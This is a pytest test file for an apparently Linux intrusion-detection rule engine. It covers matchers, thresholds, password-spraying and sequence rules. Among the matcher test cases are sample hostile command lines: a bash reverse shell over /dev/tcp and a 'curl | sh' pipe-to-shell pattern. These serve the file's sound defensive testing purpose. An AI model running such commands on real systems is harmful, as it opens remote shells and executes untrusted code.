import pytest

from linuxguard.config import default_rules_path
from linuxguard.detection.rules import RuleDefinitionError, RuleEngine, load_rules, parse_rule, parse_rules
from linuxguard.detection.rules.conditions import EventMatcher
from linuxguard.domain.alerts import Severity
from linuxguard.domain.events import EventCategory, Outcome


def failure(make_event, timestamp, ip="203.0.113.7", user="root"):
    return make_event(
        timestamp=timestamp,
        category=EventCategory.AUTHENTICATION,
        outcome=Outcome.FAILURE,
        src_ip=ip,
        user=user,
        action="ssh_login",
    )


@pytest.mark.parametrize(
    ("specification", "values", "expected"),
    [
        ({"user": "alice"}, {"user": "alice"}, True),
        ({"user": ["bob", "alice"]}, {"user": "alice"}, True),
        ({"user": {"not_in": ["alice"]}}, {"user": "alice"}, False),
        ({"executable": {"prefix": ["/tmp/", "/dev/shm/"]}}, {"executable": "/tmp/x"}, True),
        ({"executable": {"not_prefix": "/usr/"}}, {"executable": "/usr/bin/ls"}, False),
        ({"target_path": {"suffix": "/authorized_keys"}}, {"target_path": "/root/.ssh/authorized_keys"}, True),
        ({"command_line": {"contains": ["/dev/tcp"]}}, {"command_line": "bash -i >& /dev/tcp/1.2.3.4/1"}, True),
        ({"command_line": {"regex": "^curl .*\\| *sh$"}}, {"command_line": "curl x | sh"}, True),
        ({"src_ip": {"exists": True}}, {"src_ip": None}, False),
        ({"src_ip": {"exists": False}}, {"src_ip": None}, True),
        ({"dest_port": {"gte": 1024, "lte": 2000}}, {"dest_port": 1500}, True),
        ({"dest_port": {"gte": 1024}}, {"dest_port": None}, False),
        ({"file_mode": {"mode_any": "6000"}}, {"file_mode": 0o4755}, True),
        ({"file_mode": {"mode_any": "6000"}}, {"file_mode": 0o755}, False),
        ({"details.group": "sudo"}, {"details": {"group": "sudo"}}, True),
        ({"category": "process_execution", "outcome": "success"}, {}, True),
        ({"any_of": [{"user": "bob"}, {"action": "execve"}]}, {}, True),
        ({"any_of": [{"user": "bob"}, {"action": "open"}]}, {}, False),
    ],
)
def test_condition_operators(make_event, specification, values, expected) -> None:
    assert EventMatcher.from_mapping(specification).matches(make_event(**values)) is expected


@pytest.mark.parametrize(
    "specification",
    [
        {"unknown_field": "x"},
        {"user": {"bogus": 1}},
        {"user": {"regex": "("}},
        {"any_of": [{"user": "x"}]},
        {},
    ],
)
def test_invalid_matchers_are_rejected(specification) -> None:
    with pytest.raises(RuleDefinitionError):
        EventMatcher.from_mapping(specification)


@pytest.mark.parametrize(
    "specification",
    [
        {"name": "missing id", "match": {"user": "x"}},
        {"id": "R1", "match": {"user": "x"}, "sequence": {}},
        {"id": "R1"},
        {"id": "R1", "match": {"user": "x"}, "severity": "extreme"},
        {"id": "R1", "match": {"user": "x"}, "threshold": {"count": 0, "window_seconds": 10}},
        {"id": "R1", "match": {"user": "x"}, "unexpected": True},
        {"id": "R1", "sequence": {"within_seconds": 5, "steps": [{"match": {"user": "x"}}]}},
        {"id": "R1", "match": {"user": "x"}, "suppress_seconds": -1},
    ],
)
def test_invalid_rules_are_rejected(specification) -> None:
    with pytest.raises(RuleDefinitionError):
        parse_rule(specification)


def test_duplicate_rule_ids_are_rejected() -> None:
    rule = {"id": "R1", "match": {"user": "x"}}
    with pytest.raises(RuleDefinitionError):
        parse_rules({"rules": [rule, rule]})
    with pytest.raises(RuleDefinitionError):
        parse_rules({"not_rules": []})


def test_single_event_rule_with_exclusion_and_suppression(make_event) -> None:
    rule = parse_rule(
        {
            "id": "R1",
            "severity": "high",
            "match": {"executable": {"prefix": "/tmp/"}},
            "exclude": {"user": "builder"},
            "suppress_seconds": 30,
        }
    )
    engine = RuleEngine([rule])
    assert engine.process(make_event(executable="/tmp/a", user="builder", correlation_id="lab/session/1")) == []
    first = engine.process(make_event(timestamp=100, executable="/tmp/a", correlation_id="lab/session/1"))
    repeated = engine.process(make_event(timestamp=110, executable="/tmp/b", correlation_id="lab/session/1"))
    other_session = engine.process(make_event(timestamp=111, executable="/tmp/b", correlation_id="lab/session/2"))
    later = engine.process(make_event(timestamp=140, executable="/tmp/c", correlation_id="lab/session/1"))
    assert [len(first), len(repeated), len(other_session), len(later)] == [1, 0, 1, 1]
    assert first[0].rule.severity == Severity.HIGH


def test_threshold_rule_counts_within_window_and_applies_cooldown(make_event) -> None:
    rule = parse_rule(
        {
            "id": "R2",
            "match": {"category": "authentication", "outcome": "failure"},
            "threshold": {"count": 3, "window_seconds": 10, "group_by": ["src_ip"]},
        }
    )
    engine = RuleEngine([rule])
    results = [len(engine.process(failure(make_event, timestamp))) for timestamp in (0, 1, 20, 21, 22, 23, 24)]
    assert results == [0, 0, 0, 0, 1, 0, 0]
    assert len(engine.process(failure(make_event, 40))) == 0
    assert len(engine.process(failure(make_event, 41))) == 0
    match = engine.process(failure(make_event, 42))
    assert len(match) == 1
    assert len(match[0].events) == 3
    assert "3 events within 10s for src_ip=203.0.113.7" in match[0].reason


def test_threshold_rule_groups_independently(make_event) -> None:
    rule = parse_rule(
        {
            "id": "R3",
            "match": {"category": "authentication"},
            "threshold": {"count": 2, "window_seconds": 60, "group_by": "src_ip"},
        }
    )
    engine = RuleEngine([rule])
    assert engine.process(failure(make_event, 1, ip="1.1.1.1")) == []
    assert engine.process(failure(make_event, 2, ip="2.2.2.2")) == []
    assert len(engine.process(failure(make_event, 3, ip="1.1.1.1"))) == 1


def test_distinct_threshold_detects_password_spraying(make_event) -> None:
    rule = parse_rule(
        {
            "id": "R4",
            "match": {"category": "authentication", "outcome": "failure"},
            "threshold": {"count": 3, "distinct": "user", "window_seconds": 300, "group_by": ["src_ip"]},
        }
    )
    engine = RuleEngine([rule])
    same_user = [engine.process(failure(make_event, index, user="root")) for index in range(5)]
    assert all(not result for result in same_user)
    engine.process(failure(make_event, 10, user="admin"))
    matches = engine.process(failure(make_event, 11, user="oracle"))
    assert len(matches) == 1
    assert "3 distinct user values" in matches[0].reason


def test_sequence_rule_requires_ordered_steps_within_time(make_event) -> None:
    rule = parse_rule(
        {
            "id": "R5",
            "sequence": {
                "within_seconds": 100,
                "group_by": ["src_ip"],
                "steps": [
                    {"match": {"category": "authentication", "outcome": "failure"}, "min_count": 2},
                    {"match": {"category": "authentication", "outcome": "success"}},
                ],
            },
        }
    )
    engine = RuleEngine([rule])
    success = {"category": EventCategory.AUTHENTICATION, "outcome": Outcome.SUCCESS, "src_ip": "203.0.113.7"}
    assert engine.process(make_event(timestamp=0, **success)) == []
    engine.process(failure(make_event, 1))
    assert engine.process(make_event(timestamp=2, **success)) == []
    engine.process(failure(make_event, 3))
    engine.process(failure(make_event, 4))
    matches = engine.process(make_event(timestamp=5, **success))
    assert len(matches) == 1
    assert len(matches[0].events) == 4
    engine.process(failure(make_event, 10))
    engine.process(failure(make_event, 11))
    assert engine.process(make_event(timestamp=200, **success)) == []


def test_expired_state_is_released(make_event) -> None:
    rule = parse_rule(
        {
            "id": "R6",
            "match": {"category": "authentication"},
            "threshold": {"count": 50, "window_seconds": 5, "group_by": ["src_ip"]},
        }
    )
    engine = RuleEngine([rule])
    for index in range(1000):
        engine.process(failure(make_event, index, ip=f"10.0.{index // 250}.{index % 250}"))
    evaluator = engine._evaluators[0]
    assert len(evaluator._windows) < 20


def test_default_rule_set_loads_and_is_well_formed() -> None:
    rules = load_rules(default_rules_path())
    assert len(rules) >= 20
    for rule in rules:
        assert rule.description
        assert rule.explanation
        assert rule.response
        assert rule.technique


def test_disabled_rules_are_not_loaded(tmp_path) -> None:
    path = tmp_path / "rules.yaml"
    path.write_text("rules:\n  - id: A\n    match: {user: x}\n  - id: B\n    enabled: false\n    match: {user: y}\n")
    assert [rule.rule_id for rule in load_rules(path)] == ["A"]
